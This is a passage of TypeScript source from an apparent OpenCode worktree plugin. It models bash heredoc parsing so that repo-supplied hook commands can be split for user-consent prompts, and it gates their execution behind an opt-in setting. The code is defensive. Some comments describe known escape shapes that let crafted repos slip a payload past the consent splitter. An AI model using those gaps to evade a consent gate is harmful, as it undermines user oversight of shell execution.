			const word = parseHeredocDelimiter(command, i + (stripTabs ? 3 : 2))
			if (word !== undefined) heredocs.push({ ...word, stripTabs })
		}
		if (char === "|" || char === "&") {
			// A lone `&` backgrounds and must split, except next to `>` (`2>&1`, `&>`).
			const redirectAdjacent = command[i - 1] === ">" || command[i + 1] === ">"
			const isOperator = char === "|" || (char === "&" && !redirectAdjacent)
			if (isOperator && command[i + 1] === char) i++
			if (isOperator) {
				segments.push(current)
				current = ""
				lastCharEscaped = false
				continue
			}
		}
		current += char
		lastCharEscaped = false
	}
	segments.push(current)
	const trimmed = segments.map((segment) => segment.trim()).filter((segment) => segment.length > 0)
	// Fallback keeps the original string (e.g. whitespace-only input) so the caller always asserts something.
	return trimmed.length > 0 ? trimmed : [command]
}

/**
 * Parse a heredoc delimiter right after `<<` / `<<-`, plus whether bash considers the word
 * quoted (quoted words keep the body literal and match their terminator line raw). A quoted
 * chunk's bytes are stored the way bash stores them: `$'…'` escapes decoded, and a quoted
 * chunk's contribution carries bash's control-byte protection (0x01 → `01 01`, 0x7f →
 * `01 7f`; see protectControlBytes), which terminator lines must reproduce.
 * Returns undefined for anything ambiguous: arithmetic shifts like `let x=1<<2` are lexically
 * indistinguishable from `<<` redirects, and a word bash itself rejects (unclosed quote,
 * substitution or backslash at end of input) is refused — bash then syntax-errors out, so
 * nothing executes and the refusal is safe. `$'…'`/`$"…"` chunks are decoded and `$(…)`/
 * backtick chunks are modeled as bash resolves them: literal, unexpanded source text that
 * becomes part of the delimiter without quoting the word. A decoded NUL ends its `$'…'`
 * chunk, and the word itself ends only at blank, newline or `;&|<>()` — every other char
 * (CR, VT, FF, NBSP, U+2028, …) stays part of the delimiter, exactly as in bash
 * (`<<EOF\r` has the delimiter `EOF\r`).
 */
function parseHeredocDelimiter(
	command: string,
	index: number,
): { delimiter: string; quoted: boolean } | undefined {
	let i = index
	while (command[i] === " " || command[i] === "\t") i++
	let delimiter = ""
	let parsed = false
	let quoted = false
	while (i < command.length) {
		const char = command[i]
		if (char === "$" && command[i + 1] === "'") {
			// ANSI-C chunk: bash decodes the escapes while resolving the word, so
			// `<<$'\x45OF'` terminates on a line `EOF`, and the word counts as quoted.
			// A decoded NUL ends the chunk (bash appends it as a C string) while later
			// chunks and plain chars keep appending: `<<$'E\0OF'` is `E`, `<<$'E\0OF'Y`
			// is `EY` (probed). The decoded bytes carry bash's control-byte protection
			// (0x01 → `01 01`, 0x7f → `01 7f` — probed; see protectControlBytes).
			const decoded = decodeAnsiCWord(command, i + 2)
			if (decoded === undefined) return undefined
			const nul = decoded.value.indexOf("\0")
			delimiter += nul === -1 ? decoded.value : decoded.value.slice(0, nul)
			i = decoded.next
			parsed = true
			quoted = true
			continue
		}
		if (char === "$" && command[i + 1] === '"') {
			// `$"…"` quotes exactly like `"…"` (locale translation is a no-op here).
			const decoded = parseDoubleQuotedWord(command, i + 1)
			if (decoded === undefined) return undefined
			delimiter += decoded.value
			i = decoded.next
			parsed = true
			quoted = true
			continue
		}
		if (char === "$" && command[i + 1] === "(") {
			// Command substitution: bash keeps its source literal (no expansion) and the word
			// stays unquoted — `<<$(echo 'EOF')` keeps the inner quotes and still expands its
			// body — so its verbatim text is part of the delimiter (probed).
			const span = consumeCommandSubstitution(command, i, "raw")
			if (span === undefined) return undefined
			delimiter += span.value
			i = span.next
			parsed = true
			continue
		}
		if (char === "`") {
			// Backticks follow the same literal-source rule (probed).
			const span = consumeBacktickWord(command, i, "raw")
			if (span === undefined) return undefined
			delimiter += span.value
			i = span.next
			parsed = true
			continue
		}
		if (!/[ \t\n;&|<>()'"\\]/.test(char)) {
			// Bash delimiter words take any char except blank, newline and the metacharacters
			// `;&|<>()`; chars a JS `\s` test would also stop at (CR, VT, FF, NBSP, U+2028, …)
			// are ordinary word chars — `<<EOF\r` has the delimiter `EOF\r`. A word starting
			// with `#` is a comment, so it cannot open a heredoc.
			if (!parsed && char === "#") return undefined
			delimiter += char
			i++
			parsed = true
			continue
		}
		if (char === "'") {
			const close = command.indexOf("'", i + 1)
			if (close === -1) return undefined
			// Content is raw except for bash's control-byte protection: the stored word has
			// 0x01 → `01 01` and 0x7f → `01 7f`, which terminator lines must reproduce.
			delimiter += protectControlBytes(command.slice(i + 1, close))
			i = close + 1
			parsed = true
			quoted = true
			continue
		}
		if (char === '"') {
			const decoded = parseDoubleQuotedWord(command, i)
			if (decoded === undefined) return undefined
			delimiter += decoded.value
			i = decoded.next
			parsed = true
			quoted = true
			continue
		}
		if (char === "\\") {
			if (i + 1 >= command.length) return undefined
			if (command[i + 1] === "\n") {
				// `\`-newline: the word continues on the next line (bash line continuation),
				// but it does not quote the body — the join still applies to terminators.
				i += 2
				continue
			}
			delimiter += command[i + 1]
			i += 2
			parsed = true
			quoted = true
			continue
		}
		break
	}
	if (!parsed) return undefined
	// An empty delimiter is valid when it comes from quoted chunks (`<<''`, `<<$''`, a
	// NUL-truncated `<<$'\0…'`): bash then terminates the body on an empty line, so it must
	// keep body-mode protection too.
	const after = command[i]
	// Blank, newline and the metacharacters end the word; bash's word continues through
	// everything else (CR, VT, FF, NBSP, U+2028, … included).
	const endsWord = after === undefined || " \t\n;&|<>()".includes(after)
	return endsWord ? { delimiter, quoted } : undefined
}

/**
 * Parse a `"…"` chunk of a delimiter word (index at the opening quote). Bash only treats `\`
 * as special before `" \ $ ` and newline; before any other char the backslash is a literal.
 * Quoted content is stored with bash's control-byte protection (see protectControlBytes).
 */
function parseDoubleQuotedWord(
	command: string,
	index: number,
): { value: string; next: number } | undefined {
	let value = ""
	let i = index + 1
	while (i < command.length) {
		const char = command[i]
		if (char === '"') return { value: protectControlBytes(value), next: i + 1 }
		if (char === "$" && command[i + 1] === "(") {
			// A substitution inside `"…"`: same literal source, but this one sits in a
			// double-quote context, so inner `"…"` chunks lose their quotes (probed).
			const span = consumeCommandSubstitution(command, i, "dq")
			if (span === undefined) return undefined
			value += span.value
			i = span.next
			continue
		}
		if (char === "`") {
			const span = consumeBacktickWord(command, i, "dq")
			if (span === undefined) return undefined
			value += span.value
			i = span.next
			continue
		}
		if (char !== "\\") {
			value += char
			i++
			continue
		}
		const next = command[i + 1]
		if (next === undefined) return undefined
		if (next === "\n") {
			// `\`-newline inside `"…"`: both chars vanish from the word.
			i += 2
			continue
		}
		if (next === '"' || next === "\\" || next === "$" || next === "`") {
			value += next
			i += 2
			continue
		}
		value += "\\"
		i++
	}
	return undefined
}

/** `raw` = word level, `dq` = inside a `"…"` chunk (bash strips inner `"` quotes there). */
type HeredocWordMode = "raw" | "dq"

/**
 * One `\`-pair inside a delimiter-word substitution. Word level keeps both chars verbatim
 * (probed: `<<$(echo \$x)` keeps the backslash); in a `dq` context the backslash disappears
 * before `"`, `\`, `$`, a backtick and newline (the newline vanishes too; probed), otherwise
 * both chars stay.
 */
function consumeSpanBackslash(
	command: string,
	index: number,
	mode: HeredocWordMode,
): { value: string; next: number } | undefined {
	const next = command[index + 1]
	if (next === undefined) return undefined
	if (mode === "raw") return { value: command.slice(index, index + 2), next: index + 2 }
	if (next === "\n") return { value: "", next: index + 2 }
	if (next === '"' || next === "\\" || next === "$" || next === "`") {
		return { value: next, next: index + 2 }
	}
	return { value: command.slice(index, index + 2), next: index + 2 }
}

/**
 * Emit the inside of a `"…"` chunk nested in a substitution inside outer double quotes
 * (`<<"$(echo "x")"`): the inner `"` are removed by quote removal, `\` keeps its dq rules,
 * everything else — `'` included — stays literal (probed).
 */
function stringifyDqInner(command: string, start: number, end: number): string {
	let value = ""
	let i = start
	while (i < end) {
		const char = command[i]
		if (char === "\\") {
			const unit = consumeSpanBackslash(command, i, "dq")
			if (unit === undefined) break
			value += unit.value
			i = unit.next
			continue
		}
		value += char
		i++
	}
	return value
}

/**
 * One unit of a `$(…)` body that must be consumed whole so its parens never count: quote
 * chunks, escapes, nested substitutions and `${…}`. `'…'` and `${…}` stay verbatim in both
 * modes; `"…"` keeps its quotes at word level and drops them in `dq` (probed).
 */
function consumeQuotedUnit(
	command: string,
	index: number,
	mode: HeredocWordMode,
): { value: string; next: number } | undefined {
	const char = command[index]
	if (char === "\\") return consumeSpanBackslash(command, index, mode)
	if (char === "'") {
		const close = command.indexOf("'", index + 1)
		if (close === -1) return undefined
		return { value: command.slice(index, close + 1), next: close + 1 }
	}
	if (char === '"') {
		let j = index + 1
		while (j < command.length) {
			if (command[j] === "\\") {
				if (j + 1 >= command.length) return undefined
				j += 2
				continue
			}
			if (command[j] === '"') break
			j++
		}
		if (j >= command.length) return undefined
		const value =
			mode === "raw" ? command.slice(index, j + 1) : stringifyDqInner(command, index + 1, j)
		return { value, next: j + 1 }
	}
	if (char === "`") return consumeBacktickWord(command, index, mode)
	if (char === "$" && command[index + 1] === "(") {
		return consumeCommandSubstitution(command, index, mode)
	}
	if (char === "$" && command[index + 1] === "{") {
		// `${…}`: braces balance, `\` escapes; the text stays verbatim in both modes.
		let depth = 0
		let j = index + 1
		while (j < command.length) {
			const c = command[j]
			if (c === "\\") {
				if (j + 1 >= command.length) return undefined
				j += 2
				continue
			}
			if (c === "{") depth++
			if (c === "}") {
				depth--
				if (depth === 0) return { value: command.slice(index, j + 1), next: j + 1 }
			}
			j++
		}
		return undefined
	}
	return undefined
}

/**
 * Consume a `$(…)` chunk of a delimiter word (index at `$`). Bash never executes it there: the
 * literal source becomes part of the delimiter, so this only tracks which parens are real —
 * quote chunks, escapes and nested substitutions are consumed whole via consumeQuotedUnit.
 */
function consumeCommandSubstitution(
	command: string,
	index: number,
	mode: HeredocWordMode,
): { value: string; next: number } | undefined {
	let depth = 1
	let value = "$("
	let i = index + 2
	while (i < command.length) {
		const char = command[i]
		if (char === "(") {
			depth++
			value += char
			i++
			continue
		}
		if (char === ")") {
			depth--
			value += char
			i++
			if (depth === 0) return { value, next: i }
			continue
		}
		const unit = consumeQuotedUnit(command, i, mode)
		if (unit === undefined) {
			value += char
			i++
			continue
		}
		value += unit.value
		i = unit.next
	}
	return undefined
}

/**
 * Consume a backtick chunk of a delimiter word (index at the opening backtick). Same literal
 * rule; backticks close on the next unescaped backtick regardless of quotes (probed), and in a
 * `dq` context a bare `"` drops out of the word.
 */
function consumeBacktickWord(
	command: string,
	index: number,
	mode: HeredocWordMode,
): { value: string; next: number } | undefined {
	let value = "`"
	let i = index + 1
	while (i < command.length) {
		const char = command[i]
		if (char === "`") return { value: value + char, next: i + 1 }
		if (char === "\\") {
			const unit = consumeSpanBackslash(command, i, mode)
			if (unit === undefined) return undefined
			value += unit.value
			i = unit.next
			continue
		}
		if (mode === "dq" && char === '"') {
			i++
			continue
		}
		value += char
		i++
	}
	return undefined
}

/**
 * Bash stores a quoted heredoc word with its control bytes protected the way the lexer does
 * (CTLESC/CTLNUL): a 0x01 byte in the chunk becomes `01 01` and 0x7f becomes `01 7f`, and
 * terminator lines are compared against those stored bytes (probed: a single-0x01 line never
 * terminates `<<$'E\x01OF'`, the doubled line does; `\cA`, `\u0001` and a raw 0x01 in the
 * chunk protect alike). Only quoted chunks are protected — plain word chars, `\`-escaped
 * chars and `$(…)`/backtick source text compare raw (probed). The 0x01 pass runs first so the
 * bytes it inserts are not doubled by the 0x7f pass.
 */
function protectControlBytes(value: string): string {
	return value.replaceAll("\u0001", "\u0001\u0001").replaceAll("\u007f", "\u0001\u007f")
}

/**
 * Decode a `$'…'` chunk body (starting after the opening quote) the way bash does, so the
 * delimiter equals the bytes bash compares terminator lines against: the decoded bytes carry
 * bash's control-byte protection (see protectControlBytes) and a decoded NUL stays in the
 * value — the caller cuts the chunk there (bash appends each chunk as a C string, so `\0`,
 * `\x00`, `\u0000` and `\c@` end it — `<<$'E\0OF'` has the delimiter `E`). `\c` right before
 * the closing quote stays literal (`<<$'\c'` is `\c`): bash needs a char after `\c`.
 */
function decodeAnsiCWord(
	command: string,
	start: number,
): { value: string; next: number } | undefined {
	let value = ""
	let i = start
	while (i < command.length) {
		const char = command[i]
		if (char === "'") return { value: protectControlBytes(value), next: i + 1 }
		if (char !== "\\") {
			value += char
			i++
			continue
		}
		const decoded = decodeAnsiCEscape(command, i, 0)
		if (decoded === undefined) return undefined
		value += decoded.value
		i = decoded.next
	}
	return undefined
}

/** One ANSI-C escape (the `\` at `index`), decoded to what bash emits. */
function decodeAnsiCEscape(
	command: string,
	index: number,
	depth: number,
): { value: string; next: number } | undefined {
	const next = command[index + 1]
	if (next === undefined) return undefined
	const simple: Record<string, string> = {
		a: "\u0007",
		b: "\b",
		e: "\u001b",
		E: "\u001b",
		f: "\f",
		n: "\n",
		r: "\r",
		t: "\t",
		v: "\u000b",
		"\\": "\\",
		"'": "'",
		'"': '"',
		"?": "?",
	}
	if (simple[next] !== undefined) return { value: simple[next], next: index + 2 }
	if (next === "c") {
		// `\cX` is `X & 0x1f`; when `X` starts an escape this decodes it and reuses its first
		// char (`\c\A` is 0x1c + `A`).
		// shortcut: bash instead masks the literal next char and keeps the rest (`\c\''` is
		// 0x1c + `'`, `\c\n` is 0x1c + `n` — probed), so a word with `\c\<other escape>` can
		// miss its terminator and hand bash-live text to the fallback merge; tracked in
		// FOLLOWUPS.md (`cq2`/`cn` shapes there are silent by default).
		const target = command[index + 2]
		if (target === undefined) return undefined
		if (target === "'") {
			// `\c` right before the chunk's closing quote: bash needs a character after `\c`,
			// so it stays literal and the quote still closes the chunk (`$'\c'` is `\c`,
			// `$'\c'X` is `\cX` — probed). Consuming the quote would decode a BEL and run the
			// chunk into later text, turning later commands into heredoc body data.
			return { value: "\\c", next: index + 2 }
		}
		let inner: { value: string; next: number }
		if (target === "\\") {
			if (depth >= 2) return undefined
			const decoded = decodeAnsiCEscape(command, index + 2, depth + 1)
			if (decoded === undefined) return undefined
			inner = decoded
		} else {
			inner = { value: target, next: index + 3 }
		}
		const first = String.fromCharCode(inner.value.charCodeAt(0) & 0x1f)
		return { value: first + inner.value.slice(1), next: inner.next }
	}
	if (next >= "0" && next <= "7") {
		let digits = ""
		let j = index + 1
		while (j < command.length && digits.length < 3 && command[j] >= "0" && command[j] <= "7") {
			digits += command[j]
			j++
		}
		return { value: String.fromCharCode(parseInt(digits, 8) & 0xff), next: j }
	}
	if (next === "x" || next === "u" || next === "U") {
		const max = next === "x" ? 2 : next === "u" ? 4 : 8
		let digits = ""
		let j = index + 2
		while (j < command.length && digits.length < max && /[0-9a-fA-F]/.test(command[j])) {
			digits += command[j]
			j++
		}
		if (digits.length === 0) return { value: "\\" + next, next: index + 2 }
		const code = parseInt(digits, 16)
		if (next === "x") return { value: String.fromCharCode(code), next: j }
		return { value: encodeBashUtf8(code), next: j }
	}
	// Unknown escapes keep the backslash (`$'\z'` is the two chars `\z`).
	return { value: "\\" + next, next: index + 2 }
}

/**
 * `\u`/`\U` escapes: bash emits UTF-8 bytes, including for surrogates and for values above
 * U+10FFFF that no JavaScript character exists for. Valid scalar values map to their character
 * (what a terminator line in the command text is made of); anything else keeps the raw bytes as
 * code-unit chars — command text can never contain those bytes, so the terminator is unreachable
 * and a mismatch can only over-split.
 */
function encodeBashUtf8(code: number): string {
	if (code <= 0x10ffff && !(code >= 0xd800 && code <= 0xdfff)) return String.fromCodePoint(code)
	let bytes: number[]
	if (code < 0x800) {
		bytes = [0xc0 | (code >> 6), 0x80 | (code & 0x3f)]
	} else if (code < 0x10000) {
		bytes = [0xe0 | (code >> 12), 0x80 | ((code >> 6) & 0x3f), 0x80 | (code & 0x3f)]
	} else if (code < 0x200000) {
		bytes = [
			0xf0 | (code >> 18),
			0x80 | ((code >> 12) & 0x3f),
			0x80 | ((code >> 6) & 0x3f),
			0x80 | (code & 0x3f),
		]
	} else if (code < 0x4000000) {
		bytes = [
			0xf8 | (code >> 24),
			0x80 | ((code >> 18) & 0x3f),
			0x80 | ((code >> 12) & 0x3f),
			0x80 | ((code >> 6) & 0x3f),
			0x80 | (code & 0x3f),
		]
	} else {
		bytes = [
			0xfc | (code >> 30),
			0x80 | ((code >> 24) & 0x3f),
			0x80 | ((code >> 18) & 0x3f),
			0x80 | ((code >> 12) & 0x3f),
			0x80 | ((code >> 6) & 0x3f),
			0x80 | (code & 0x3f),
		]
	}
	return bytes.map((byte) => String.fromCharCode(byte)).join("")
}

/**
 * Return the index just past the last heredoc terminator line, or undefined when any terminator
 * is missing. Matching mirrors bash: quoted delimiter words compare the line raw, unquoted words
 * first remove `\`-newline continuations (a line with an odd trailing-backslash count continues
 * into the next physical line) and `<<-` then strips leading tabs of the joined line. Without a
 * terminator there is no body mode and the text falls into the line-wise scan — which can merge
 * heredoc data with later commands only for the word shapes bash never terminates either (see
 * the gaps list in splitHookCommands). The terminator bytes this model compares equal bash's
 * for every word it accepts except the `\c`-escape shapes in that list, so away from those
 * shapes a terminator it finds is the one bash finds (NUL-truncated `$'…'` chunks and
 * CR/VT/FF/NBSP-bearing words included).
 */
function findHeredocEnd(
	command: string,
	from: number,
	heredocs: { delimiter: string; stripTabs: boolean; quoted: boolean }[],
): number | undefined {
	let position = from
	for (const heredoc of heredocs) {
		let end: number | undefined
		while (position <= command.length) {
			const newline = command.indexOf("\n", position)
			const lineEnd = newline === -1 ? command.length : newline
			let line = command.slice(position, lineEnd)
			let logicalEnd = newline === -1 ? command.length : newline + 1
			if (!heredoc.quoted) {
				// Unquoted word: bash removes `\`-newline continuations before comparing the
				// line, so an odd trailing-backslash run joins the next physical line.
				while (hasOddTrailingBackslashes(line) && logicalEnd < command.length) {
					const nextNewline = command.indexOf("\n", logicalEnd)
					const endOfNext = nextNewline === -1 ? command.length : nextNewline
					line = line.slice(0, -1) + command.slice(logicalEnd, endOfNext)
					logicalEnd = nextNewline === -1 ? command.length : nextNewline + 1
				}
			}
			const candidate = heredoc.stripTabs ? line.replace(/^\t+/, "") : line
			if (candidate === heredoc.delimiter) {
				end = logicalEnd
				break
			}
			if (newline === -1) break
			position = logicalEnd
		}
		if (end === undefined) return undefined
		position = end
	}
	return position
}

/** A line continues into the next one when its trailing backslash run has odd length. */
function hasOddTrailingBackslashes(line: string): boolean {
	let count = 0
	for (let i = line.length - 1; i >= 0 && line[i] === "\\"; i--) count++
	return count % 2 === 1
}

/**
 * Detect a permission denial thrown by `ctx.permission.assert` so callers can react
 * (e.g. stop re-prompting). The raw `Permission.DeclinedError` may cross the plugin RPC
 * boundary as a plain tagged object, so match the `_tag` rather than the class identity;
 * a `Tool.Error` wrapper (deny rule / rejection with feedback) is also matched via `.error`.
 */
function isPermissionDenial(error: unknown): boolean {
	if (!(error && typeof error === "object")) return false
	const candidate = error as { _tag?: unknown; error?: unknown }
	if (candidate._tag === "Permission.DeclinedError" || candidate._tag === "Permission.BlockedError") {
		return true
	}
	const cause = candidate.error
	return (
		!!cause &&
		typeof cause === "object" &&
		((cause as { _tag?: unknown })._tag === "Permission.DeclinedError" ||
			(cause as { _tag?: unknown })._tag === "Permission.BlockedError")
	)
}

/** Subset of the V2 permission domain used to gate repo-controlled hook commands. */
interface HookConsentGate {
	assert(input: {
		sessionID: string
		action: string
		resources: string[]
		source?: { type: "tool"; messageID: string; id: string }
	}): Promise<void>
}

/**
 * Bind a user-consent prompt for hook commands to the V2 permission API.
 * Returns undefined when the runtime cannot prompt (no permission API or no session ID),
 * which makes runHooks fail closed instead of executing the command.
 */
function bindHookConsent(
	permission: HookConsentGate | undefined,
	context: { sessionID?: string; messageID?: string; id?: string },
): ((command: string) => Promise<void>) | undefined {
	const gate = permission
	const sessionID = context.sessionID
	if (!gate?.assert || !sessionID) return undefined
	const source =
		context.messageID && context.id
			? { type: "tool" as const, messageID: context.messageID, id: context.id }
			: undefined
	return (command) =>
		gate.assert({ sessionID, action: "shell", resources: splitHookCommands(command), source })
}

/**
 * Run hook commands in the worktree directory.
 *
 * Trust boundary: `commands` come from the repo-controlled `.opencode/worktree.jsonc`,
 * so they execute arbitrary shell as the user, unsandboxed. Repo hooks are therefore
 * disabled unless the operator opts in with `OPENCODE_WORKTREE_ALLOW_REPO_HOOKS=1`.
 * Even when enabled, each command must pass an explicit user-consent prompt
 * (`ctx.permission.assert`, action "shell"); a denial aborts and a missing consent
 * prompt fails closed.
 *
 * Why opt-in: the consent splitter is an approximation of bash, and crafted repos can
 * make one emitted piece execute a payload, so per-command consent is not a hard
 * boundary on its own.
 */
async function runHooks(
	cwd: string,
	commands: string[],
	log: Logger,
	approve: ((command: string) => Promise<void>) | undefined,
): Promise<void> {
	if (commands.length > 0 && process.env.OPENCODE_WORKTREE_ALLOW_REPO_HOOKS !== "1") {
		log.error("[worktree] Repo hooks blocked: OPENCODE_WORKTREE_ALLOW_REPO_HOOKS is not set to 1")
		throw new WorktreeError(
			"Repo hook execution is disabled. Set OPENCODE_WORKTREE_ALLOW_REPO_HOOKS=1 to allow repo-controlled hook commands.",
			"runHooks",
		)
	}
	for (const command of commands) {
		if (!approve) {
			log.error(`[worktree] Hook blocked, consent prompt unavailable: ${command}`)
			throw new WorktreeError(
				"Hook execution blocked: user-consent prompting is unavailable, refusing to run repo-controlled hook commands.",
				"runHooks",
			)
		}
		// Fail loud: a denied request rejects here, before the command runs.
		await approve(command)
		log.info(`[worktree] Running hook: ${command}`)
		try {
			// Use shell to properly handle quoted arguments and complex commands
			const result = Bun.spawnSync(["bash", "-c", command], {
				cwd,
				stdout: "inherit",
				stderr: "pipe",
			})
			if (result.exitCode !== 0) {
				const stderr = result.stderr?.toString() || ""
				log.warn(
					`[worktree] Hook failed (exit ${result.exitCode}): ${command}${stderr ? `\n${stderr}` : ""}`,
				)
			}
		} catch (error) {
			log.warn(`[worktree] Hook error: ${error}`)
		}
	}
}

/**
 * Resolve a path that may contain a leading `~` to the user's home directory.
 */
function resolveHomePath(p: string): string {
	if (p === "~" || p.startsWith("~/") || p.startsWith("~\\")) {
		return path.join(os.homedir(), p.slice(1))
	}
	return p
}

/**
 * Load worktree-specific configuration from .opencode/worktree.jsonc
 * Auto-creates config file with helpful defaults if it doesn't exist.
 */
async function loadWorktreeConfig(directory: string, log: Logger): Promise<WorktreeConfig> {
	// Resolve git root so a subdirectory cwd doesn't get a stray config and the repo-root config is found
	const gitRoot = await git(["rev-parse", "--show-toplevel"], directory)
	const configDir = gitRoot.ok ? gitRoot.value : directory
	const configPath = path.join(configDir, ".opencode", "worktree.jsonc")

	try {
		const file = Bun.file(configPath)
		if (!(await file.exists())) {
			// Auto-create config with helpful defaults and comments
			const defaultConfig = `{
  "$schema": "https://registry.kdco.dev/schemas/worktree.json",

  // Worktree plugin configuration
  // Documentation: https://github.com/kdcokenny/ocx

  // Custom base path for worktree storage (supports ~)
  // Default: ~/.local/share/opencode/worktree
  // "worktreePath": "~/my-worktrees",

  "sync": {
    // Files to copy from main worktree to new worktrees
    // Example: [".env", ".env.local", "dev.sqlite"]
    "copyFiles": [],

    // Directories to symlink (saves disk space)
    // Example: ["node_modules"]
    "symlinkDirs": [],

    // Patterns to exclude from copying
    "exclude": []
  },

  "hooks": {
    // Commands to run after worktree creation
    // Example: ["pnpm install", "docker compose up -d"]
    "postCreate": [],

    // Commands to run before worktree deletion
    // Example: ["docker compose down"]
    "preDelete": []
  }
}
`
			// Ensure .opencode directory exists
			await mkdir(path.join(configDir, ".opencode"), { recursive: true })
			await Bun.write(configPath, defaultConfig)
			log.info(`[worktree] Created default config: ${configPath}`)
			return worktreeConfigSchema.parse({})
		}

		const content = await file.text()
		// Use proper JSONC parser (handles comments in strings correctly)
		const parsed = parseJsonc(content)
		if (parsed === undefined) {
			log.error(`[worktree] Invalid worktree.jsonc syntax`)
			return worktreeConfigSchema.parse({})
		}
		const config = worktreeConfigSchema.parse(parsed)
		if (config.worktreePath) {
			config.worktreePath = resolveHomePath(config.worktreePath)
		}
		return config
	} catch (error) {
		log.warn(`[worktree] Failed to load config: ${error}`)
		return worktreeConfigSchema.parse({})
	}
}

// =============================================================================
// PLUGIN ENTRY
// =============================================================================

export default Object.assign(
	Plugin.define({
		id: "worktree",
		async setup(ctx) {
			const directory = ctx.location.directory

			const log: Logger = {
				debug: (msg: string) => console.debug(msg),
				info: (msg: string) => console.info(msg),
				warn: (msg: string) => console.warn(msg),
				error: (msg: string) => console.error(msg),
			}

			// Initialize SQLite database
			const database = await initDb(directory, log)

			await ctx.tool.transform((editor) => {
				editor.add({
					name: "worktree_create",
					description:
						"Create a new git worktree for isolated development. A new terminal will open with OpenCode in the worktree.",
					input: {
						type: "object",
						properties: {
							branch: {
								type: "string",
								description: "Branch name for the worktree (e.g., 'feature/dark-mode')",
							},
							baseBranch: {
								type: "string",
								description: "Base branch to create from (defaults to HEAD)",
							},
						},
						required: ["branch"],
						additionalProperties: false,
					},
					execute: async (
						args: { branch: string; baseBranch?: string },
						context: { sessionID?: string; messageID?: string; id?: string },
					) => {
						// Guard: sessionID is required to fork the session; reject before creating a worktree
						if (!context.sessionID) {
							return { content: `❌ Cannot create worktree: no session ID available` }
						}

						// Validate branch name at boundary
						const branchResult = branchNameSchema.safeParse(args.branch)
						if (!branchResult.success) {
							return { content: `❌ Invalid branch name: ${branchResult.error.issues[0]?.message}` }
						}

						// Validate base branch name at boundary
						if (args.baseBranch) {
							const baseResult = branchNameSchema.safeParse(args.baseBranch)
							if (!baseResult.success) {
								return { content: `❌ Invalid base branch name: ${baseResult.error.issues[0]?.message}` }
							}
						}

						let activeLaunchContext: ActiveLaunchContext
						try {
							activeLaunchContext = parseActiveLaunchContext(
								process.env as Record<string, string | undefined>,
							)
							activeLaunchContext = await ensureLaunchContextExecutable(
								activeLaunchContext,
								directory,
							)
							await ensureLaunchContextProfile(activeLaunchContext)
						} catch (error) {
							return { content: `❌ ${error instanceof Error ? error.message : String(error)}` }
						}

						// Load config first so worktreePath is available for createWorktree
						const worktreeConfig = await loadWorktreeConfig(directory, log)

						// Create worktree
						const result = await createWorktree(
							directory,
							args.branch,
							args.baseBranch,
							worktreeConfig.worktreePath,
						)
						if (!result.ok) {
							return { content: `Failed to create worktree: ${result.error}` }
						}

						const worktreePath = result.value

						// Sync files from main worktree
						const mainWorktreePath = directory // The repo root is the main worktree

						// Copy files
						if (worktreeConfig.sync.copyFiles.length > 0) {
							await copyFiles(mainWorktreePath, worktreePath, worktreeConfig.sync.copyFiles, log)
						}

						// Symlink directories
						if (worktreeConfig.sync.symlinkDirs.length > 0) {
							await symlinkDirs(mainWorktreePath, worktreePath, worktreeConfig.sync.symlinkDirs, log)
						}

						// Run postCreate hooks (each command requires explicit user approval)
						if (worktreeConfig.hooks.postCreate.length > 0) {
							try {
								await runHooks(
									worktreePath,
									worktreeConfig.hooks.postCreate,
									log,
									bindHookConsent(ctx.permission, context),
								)
							} catch (error) {
								// No cleanup here by design; the message must still point at the created worktree.
								throw new WorktreeError(
									`${error instanceof Error ? error.message : String(error)}\nWorktree created at ${worktreePath}. Verify hook settings and retry.`,
									"postCreate hooks",
									error,
								)
							}
						}

						// Fork session with context (replaces --session resume)
						const projectId = await getProjectId(worktreePath)
						const { forkedSession, planCopied, delegationsCopied } = await forkWithContext(
							ctx,
							context.sessionID ?? "",
							worktreePath,
							projectId,
							async (sid) => {
								// Walk up parentID chain to find root session
								let currentId = sid
								for (let depth = 0; depth < MAX_SESSION_CHAIN_DEPTH; depth++) {
									const session = await ctx.session.get({ sessionID: currentId })
									if (!session.parentID) return currentId
									currentId = session.parentID
								}
								return currentId
							},
							log,
						)

						log.debug(
							`Forked session ${forkedSession.id}, plan: ${planCopied}, delegations: ${delegationsCopied}`,
						)
						const persistedLaunchMetadata = toPersistedLaunchMetadata(activeLaunchContext)
						const launchArgv = buildSessionLaunchArgv(forkedSession.id, persistedLaunchMetadata)
						const serializedLaunchMetadata = serializePersistedLaunchMetadata(persistedLaunchMetadata)

						const terminalResult = await finalizeWorktreeLaunch({
							database,
							worktreePath,
							launchArgv,
							branch: args.branch,
							forkedSessionId: forkedSession.id,
							sessionRecord: {
								id: forkedSession.id,
								branch: args.branch,
								path: worktreePath,
								createdAt: new Date().toISOString(),
								launchMode: serializedLaunchMetadata.launchMode,
								profile: serializedLaunchMetadata.profile,
								ocxBin: serializedLaunchMetadata.ocxBin,
							},
							log,
							deleteForkedSessionFn: async (sessionId: string) => {
								await ctx.session.remove({ sessionID: sessionId })
							},
						})

						if (!terminalResult.success) {
							return {
								content: `❌ Failed to launch worktree terminal: ${terminalResult.error ?? "unknown error"}\nWorktree created at ${worktreePath}. Verify launch settings and retry.`,
							}
						}

						return {
							content: `Worktree created at ${worktreePath}\n\nA new terminal has been opened with OpenCode.`,
						}
					},
				})

				editor.add({
					name: "worktree_delete",
					description:
						"Delete the current worktree and clean up. Changes will be committed before removal.",
					input: {
						type: "object",
						properties: {
							reason: {
								type: "string",
								description: "Brief explanation of why you are calling this tool",
							},
						},
						required: ["reason"],
						additionalProperties: false,
					},
					execute: async (_args: { reason: string }, context: { sessionID?: string }) => {
						// Find current session's worktree
						const session = getSession(database, context?.sessionID ?? "")
						if (!session) {
							return { content: `No worktree associated with this session` }
						}

						// Set pending delete for session.idle, scoped to this session (atomic operation)
						setPendingDelete(database, {
							branch: session.branch,
							path: session.path,
							sessionId: session.id,
						})

						return { content: `Worktree marked for cleanup. It will be removed when this session ends.` }
					},
				})
			})

			const controller = new AbortController()
			void (async () => {
				for await (const event of ctx.event.subscribe({ signal: controller.signal })) {
					if (event.type !== "session.idle") continue

					try {
						// Handle pending delete scoped to the session that requested it, so an
						// unrelated session going idle cannot remove this worktree.
						const pendingDelete = getPendingDelete(database, event.data?.sessionID)
						if (pendingDelete) {
							const { path: worktreePath, branch } = pendingDelete

							// Run preDelete hooks before cleanup (each command requires explicit user approval)
							const config = await loadWorktreeConfig(directory, log)
							if (config.hooks.preDelete.length > 0) {
								try {
									await runHooks(
										worktreePath,
										config.hooks.preDelete,
										log,
